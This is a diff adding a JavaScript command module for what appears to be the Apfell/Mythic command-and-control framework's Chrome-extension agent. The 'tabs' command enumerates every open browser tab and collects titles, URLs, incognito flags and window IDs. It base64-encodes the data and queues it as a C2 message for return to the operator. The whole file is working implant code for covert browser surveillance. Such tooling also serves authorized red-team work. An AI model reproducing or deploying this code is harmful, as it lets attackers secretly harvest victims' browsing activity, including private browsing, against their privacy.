@@ -1,0 +1,30 @@
+tabs = function(params) {
+    const queryInfo = {};
+    let tabs =[];
+    let taskid = params['taskid'];
+    let tasktype = params['tasktype'];
+    chrome.tabs.query(queryInfo, function(result){
+        for (i = 0; i < result.length; i++) {
+            const individualTab = {};
+            individualTab.window = result[i].title;
+            individualTab.url = result[i].url;
+            individualTab.incognito = result[i].incognito;
+            individualTab.id = result[i].id;
+            individualTab.active = result[i].active;
+            individualTab.highlighted = result[i].highlighted;
+            individualTab.windowid = result[i].windowId;
+
+            tabs.push(individualTab);
+        }
+        const data = btoa(unescape(encodeURIComponent(JSON.stringify(tabs))));
+        const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
+        let meta = {};
+        meta["metatype"] = 3;
+        meta["metadata"] = apfellMsg;
+        const metaenvelope = JSON.stringify(meta);
+        out.push(metaenvelope);
+    });
+};
+
+C2.commands[tabs.name] = tabs;
+COMMAND_ENDS_HERE
